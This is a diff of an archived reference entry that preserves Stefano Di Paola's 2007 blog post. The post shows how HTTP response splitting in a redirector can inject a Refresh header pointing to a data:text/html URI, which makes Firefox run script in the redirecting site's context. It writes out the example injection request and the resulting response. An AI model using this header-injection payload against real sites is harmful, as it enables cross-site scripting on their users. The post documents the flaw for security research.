@@ -1,14 +1,13 @@
 ---
 type: Article
 title: Wisec - The WIse SECurity
-description: "Stefano Di Paola chains HTTP response splitting into a data: URI XSS on Firefox. A redirector vulnerable to splitting is made to emit a Refresh header pointing at data:text/html with script in it, and Firefox executes that script in the redirecting site's context, extending pdp's data: URI concerns and Amit Klein's Refresh header work."
 resource: "http://www.wisec.it/sectou.php?id=472a5b8d1a4cd"
-tags: [article, webseclist-reference, wisec-it, response-splitting, header-injection, xss, http, filter-bypass, owasp-a03-2021, owasp-a05-2021]
+tags: [article, webseclist-reference, wisec-it]
 generated:
   by: webseclist-refs/1
-  at: "2026-08-11T19:37:42+00:00"
+  at: "2026-08-16T23:13:04+00:00"
 status: stable
-stale_after: 2027-08-11
+stale_after: 2027-08-16
 sources:
   - id: original
     resource: "http://www.wisec.it/sectou.php?id=472a5b8d1a4cd"
@@ -21,7 +20,7 @@ canonical_url: ""
 cited_by:
   - "2007.md:50"
 commit: ""
-content_sha256: d6ec71dde689977195d0ab8a1350b0861de7893bdf825a4420642efbfd473c6d
+content_sha256: 65250dca8ff4914188140ea5992890f590a9463a8cbd162f7d2221107094660e
 depth: full
 depth_reason: default
 kind: article
@@ -34,7 +33,7 @@ publisher_english: ""
 raw_sha256: d61ae026825da4584153d4b56212e4342f62c3b003293f2e18d8bd6d4d0a903a
 retrieved_from: "http://www.wisec.it/sectou.php?id=472a5b8d1a4cd"
 retrieved_kind: stored
-retrieved_utc: "2026-08-11T19:37:42+00:00"
+retrieved_utc: "2026-08-16T23:13:04+00:00"
 slug: wisec-it-wisec-wise-security-4
 snapshot: ""
 title_english: ""
@@ -48,7 +47,7 @@ translation_of: ""
 
 - Published: date not stated
 - Original: <http://www.wisec.it/sectou.php?id=472a5b8d1a4cd>
-- Preserved from: http://www.wisec.it/sectou.php?id=472a5b8d1a4cd (stored) on 2026-08-11
+- Preserved from: http://www.wisec.it/sectou.php?id=472a5b8d1a4cd (stored) on 2026-08-16
 - Licence: unknown
 
 Rights remain with the original author and publisher. This is a research
@@ -125,27 +124,37 @@ After having read [Pdp](http://www.gnucitizen.org)'s point of view [about](http:
  By taking all these stuff together, it will result that Http Response Splitting, could be used to inject Refresh: header and directly XSS the redirecting site.
  Let's suppose there's a redirection on example.com which acts like the following:
 
+>  GET /redirect.jsp?redir=http:// spamsite. com HTTP/1.0
 >
- GET /redirect.jsp?redir=http:// spamsite. com HTTP/1.0
-
- HTTP/1.1 302 Found
- Date: Thu, 01 Nov 2007 21:40:23 GMT
- Location: [http://](http://) spamsite. com
- Transfer-Encoding: chunked
- Content-Type: text/html
+>  HTTP/1.1 302 Found
+>  Date: Thu, 01 Nov 2007 21:40:23 GMT
+>  Location: [http://](http://) spamsite. com
+>  Transfer-Encoding: chunked
+>  Content-Type: text/html
 
  In case this script also suffers from a Http Response Splitting, an attacker could easily inject Refresh: with data: uri.
 
+>  GET /redirect.jsp?redir=data:blah%0aRefresh:+0%3b+url%3ddata:text/html%3b,<script>js</script> HTTP/1.0
 >
- GET /redirect.jsp?redir=data:blah%0aRefresh:+0%3b+url%3ddata:text/html%3b,<script>js</script> HTTP/1.0
-
- HTTP/1.1 302 Found
- Date: Thu, 01 Nov 2007 21:40:23 GMT
- Location: data:blah
- Refresh: 0; url=data:text/html;,<script>js</script>
- Transfer-Encoding: chunked
- Content-Type: text/html
+>  HTTP/1.1 302 Found
+>  Date: Thu, 01 Nov 2007 21:40:23 GMT
+>  Location: data:blah
+>  Refresh: 0; url=data:text/html;,<script>js</script>
+>  Transfer-Encoding: chunked
+>  Content-Type: text/html
 
  Firefox will happily execute it in the context of the redirector.
 
 *No comments yet.*
+
+**Comments are disabled**
+
+[Admin login](http://www.wisec.it/sectou.php?login) | This weblog is from [www.mylittlehomepage.net](http://www.mylittlehomepage.net/)
+
+# Wisec is brought to you by...
+
+Wisec is written and mantained by  Stefano Di Paola.
+
+Wisec uses open standards, including XHTML, CSS2, and XML-RPC.
+
+  |  |
